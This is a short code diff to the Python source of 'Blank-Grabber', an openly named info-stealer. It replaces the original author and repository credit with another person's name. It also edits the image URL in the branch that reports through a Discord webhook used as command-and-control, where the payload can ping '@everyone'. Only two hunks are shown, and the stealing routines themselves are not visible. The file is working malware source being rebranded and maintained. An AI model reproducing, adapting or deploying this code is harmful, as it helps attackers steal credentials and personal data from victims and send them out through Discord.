@@ -1,6 +1,6 @@
 # Python 3.10+
-# Author: Blank-c
-# Github: https://github.com/Blank-c/Blank-Grabber
+# Author: KaisarYetiandi 
+# Github: https://github.com/KaisarYetiandi 
 # Encoding: UTF-8
 
 import base64
@@ -1678,7 +1678,7 @@ class BlankGrabber:
 
         match Settings.C2[0]:
             case 0: # Discord Webhook
-                image_url = "https://github.com/KaisarYetiandi/Hongmeng/blob/main/.github/workflows/image.png"
+                image_url = "https://raw.githubusercontent.com/KaisarYetiandi/Hongmeng/refs/heads/main/.github/workflows/image.png"
 
                 payload = {
                     "content": "||@everyone||" if Settings.PingMe else "",
